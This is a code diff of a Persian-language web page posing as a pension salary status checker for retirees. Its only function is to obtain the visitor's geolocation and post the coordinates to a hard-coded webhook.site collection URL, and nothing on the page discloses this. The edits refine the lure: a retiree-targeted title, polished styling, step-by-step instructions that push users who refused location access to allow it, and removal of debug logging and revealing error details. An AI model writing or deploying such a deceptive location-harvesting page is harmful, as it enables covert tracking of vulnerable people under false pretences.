@@ -3,51 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سامانه بررسی وضعیت حقوق</title>
+    <title>سامانه بررسی وضعیت حقوق بازنشستگان</title>
     <style>
+        :root {
+            --primary-color: #2ecc71;
+            --primary-dark: #27ae60;
+            --bg-color: #f4f7f6;
+            --text-color: #2c3e50;
+            --error-color: #e74c3c;
+            --warn-color: #e67e22;
+        }
+
         * { box-sizing: border-box; }
+
         body {
-            font-family: Tahoma, Arial, sans-serif;
+            font-family: 'Tahoma', 'Arial', sans-serif;
             text-align: center;
             padding: 20px;
-            background-color: #f4f7f6;
+            background-color: var(--bg-color);
+            direction: rtl;
             margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
+
         .container {
-            max-width: 500px;
-            margin: 50px auto;
+            max-width: 450px;
+            width: 90%;
             background: white;
             padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
         }
-        h2 { color: #2c3e50; margin-bottom: 20px; }
-        p { color: #7f8c8d; line-height: 2; margin-bottom: 20px; }
+
+        h2 { color: var(--text-color); margin-bottom: 15px; font-size: 1.4rem; }
+        p { color: #7f8c8d; line-height: 1.8; margin-bottom: 25px; }
+
         .btn {
-            background-color: #2ecc71;
+            background-color: var(--primary-color);
             color: white;
-            padding: 15px 30px;
+            padding: 16px 32px;
             font-size: 18px;
             font-weight: bold;
             border: none;
             cursor: pointer;
-            border-radius: 10px;
+            border-radius: 12px;
             width: 100%;
-            max-width: 300px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        .btn:hover { background-color: #27ae60; }
-        .btn:disabled { background-color: #bdc3c7; cursor: wait; opacity: 0.7; }
+
+        .btn:hover { background-color: var(--primary-dark); transform: translateY(-2px); }
+        .btn:disabled { background-color: #bdc3c7; cursor: wait; opacity: 0.8; transform: none; }
+
         #result {
             margin-top: 25px;
-            font-weight: bold;
-            color: #34495e;
+            font-weight: 500;
+            color: #555;
+            min-height: 24px;
+            line-height: 1.7;
+            transition: all 0.3s ease;
             overflow-wrap: anywhere;
-            min-height: 20px;
-            line-height: 1.8;
         }
-        .error-msg { color: #e74c3c !important; }
-        .success-msg { color: #27ae60 !important; }
-        .warn-msg { color: #e67e22 !important; }
+
+        .error-msg { color: var(--error-color); }
+        .success-msg { color: var(--primary-dark); font-weight: bold; }
+        .warn-msg { color: var(--warn-color); }
+
+        .steps {
+            background: #fffbe6;
+            border-right: 4px solid #f39c12;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #7a5c00;
+            text-align: right;
+            line-height: 1.9;
+        }
     </style>
 </head>
 <body>
@@ -64,74 +99,72 @@
     const button = document.getElementById("locationBtn");
     const result = document.getElementById("result");
     const WEBHOOK_URL = "https://webhook.site/3e658cab-cff7-4b12-ad19-52d6e636d924";
+    const currentHost = location.hostname;
 
-    // نمایش وضعیت اولیه در کنسول
-    console.log("=== تشخیص اولیه ===");
-    console.log("Secure Context:", window.isSecureContext);
-    console.log("Protocol:", location.protocol);
-    console.log("Geolocation available:", !!navigator.geolocation);
-
-    if (navigator.permissions && navigator.permissions.query) {
+    // تشخیص وضعیت اولیه مجوز
+    window.addEventListener("load", function () {
+        if (!navigator.permissions || !navigator.permissions.query) return;
         navigator.permissions.query({ name: "geolocation" })
             .then(function (perm) {
-                console.log("Permission state:", perm.state);
-                // اگر قبلاً رد شده، از اول به کاربر بگو
                 if (perm.state === "denied") {
-                    setResult(
-                        "⚠️ دسترسی موقعیت مکانی برای این سایت <b>قبلاً رد شده</b> است.<br>" +
-                        "لطفاً روی <b>آیکون قفل</b> کنار نوار آدرس کلیک کنید، " +
-                        "«موقعیت مکانی» را روی «اجازه» بگذارید و صفحه را رفرش کنید.",
-                        "warn-msg"
-                    );
+                    showDeniedGuide();
                 }
-            });
-    }
+            })
+            .catch(function () {});
+    });
 
     button.addEventListener("click", getLocation);
 
-    function setResult(msg, cls) {
-        result.innerHTML = msg;
+    function setResult(html, cls) {
+        result.innerHTML = html;
         result.className = cls || "";
+    }
+
+    function showDeniedGuide() {
+        setResult(
+            "⚠️ دسترسی موقعیت مکانی برای این سایت <b>قبلاً رد شده</b> است و مرورگر اجازه نمی‌دهد پنجره را دوباره نشان دهد.<br>" +
+            "این یک محدودیت امنیتی مرورگر است و از داخل کد قابل بازنشانی نیست." +
+            "<div class='steps'>" +
+            "<b>راه حل:</b> روی <b>آیکون قفل</b> کنار آدرس کلیک کنید → <b>Site settings</b> → <b>Location</b> را روی <b>Ask</b> بگذارید → صفحه را <b>رفرش</b> کنید.<br>" +
+            "دامنه فعلی: <b>" + currentHost + "</b>" +
+            "</div>",
+            "warn-msg"
+        );
     }
 
     function getLocation() {
         setResult("در حال بررسی دسترسی...", "");
         button.disabled = true;
 
-        // مرحله ۱: پشتیبانی مرورگر
+        // ۱. پشتیبانی مرورگر
         if (!navigator.geolocation) {
             setResult("مرورگر شما از قابلیت مکان‌یابی پشتیبانی نمی‌کند.", "error-msg");
             button.disabled = false;
             return;
         }
 
-        // مرحله ۲: محیط امن
+        // ۲. محیط امن
         if (!window.isSecureContext) {
             setResult(
                 "⚠️ صفحه در محیط ناامن باز شده است.<br>" +
-                "Geolocation فقط در HTTPS یا localhost کار می‌کند.",
+                "Geolocation فقط در <b>HTTPS</b> یا <b>localhost</b> کار می‌کند.<br>" +
+                "دامنه فعلی: <b>" + currentHost + "</b>",
                 "warn-msg"
             );
             button.disabled = false;
             return;
         }
 
-        // مرحله ۳: بررسی مجوز
+        // ۳. بررسی مجوز
         if (navigator.permissions && navigator.permissions.query) {
             navigator.permissions.query({ name: "geolocation" })
                 .then(function (perm) {
-                    console.log("Permission before request:", perm.state);
                     if (perm.state === "denied") {
-                        setResult(
-                            "⚠️ دسترسی موقعیت مکانی رد شده است.<br>" +
-                            "آیکون قفل کنار آدرس → موقعیت مکانی → اجازه → رفرش صفحه.",
-                            "warn-msg"
-                        );
+                        showDeniedGuide();
                         button.disabled = false;
-                    } else {
-                        // مهم: اینجا مستقیم request می‌زنیم
-                        requestPosition();
+                        return;
                     }
+                    requestPosition();
                 })
                 .catch(function () {
                     requestPosition();
@@ -144,7 +177,6 @@
     function requestPosition() {
         setResult("در حال درخواست دسترسی...<br>لطفاً پنجره مرورگر را تأیید کنید.", "");
 
-        // نکته مهم: درخواست باید مستقیماً در handler کلیک باشد
         navigator.geolocation.getCurrentPosition(
             onSuccess,
             onError,
@@ -161,7 +193,6 @@
         const lng = position.coords.longitude;
         const acc = position.coords.accuracy;
 
-        console.log("موقعیت دریافت شد:", lat, lng, acc);
         setResult("موقعیت دریافت شد. در حال ارسال...", "");
 
         fetch(WEBHOOK_URL, {
@@ -183,11 +214,7 @@
         })
         .catch(function (err) {
             console.error("خطای ارسال:", err);
-            setResult(
-                "موقعیت دریافت شد اما ارسال به سرور ناموفق بود.<br>" +
-                "خطا: " + err.message,
-                "error-msg"
-            );
+            setResult("خطا در ارتباط با سرور. دوباره تلاش کنید.", "error-msg");
         })
         .finally(function () {
             button.disabled = false;
@@ -196,17 +223,20 @@
 
     function onError(error) {
         button.disabled = false;
-        console.error("Geolocation error:", error.code, error.message);
 
-        var messages = {
-            1: "دسترسی رد شد (PERMISSION_DENIED).<br>" +
-               "آیکون قفل کنار آدرس → موقعیت مکانی → اجازه → رفرش.",
-            2: "موقعیت در دسترس نیست (POSITION_UNAVAILABLE).<br>" +
-               "سرویس Location سیستم‌عامل و Wi-Fi را بررسی کنید.",
-            3: "زمان تمام شد (TIMEOUT).<br>دوباره تلاش کنید."
-        };
-
-        setResult("❌ " + (messages[error.code] || "خطای ناشناخته: " + error.message), "error-msg");
+        if (error.code === 1) {
+            showDeniedGuide();
+        } else if (error.code === 2) {
+            setResult(
+                "❌ موقعیت در دسترس نیست.<br>" +
+                "سرویس Location سیستم‌عامل و اتصال Wi-Fi را بررسی کنید.",
+                "error-msg"
+            );
+        } else if (error.code === 3) {
+            setResult("❌ زمان درخواست تمام شد. دوباره تلاش کنید.", "error-msg");
+        } else {
+            setResult("❌ خطای ناشناخته: " + error.message, "error-msg");
+        }
     }
 </script>
 
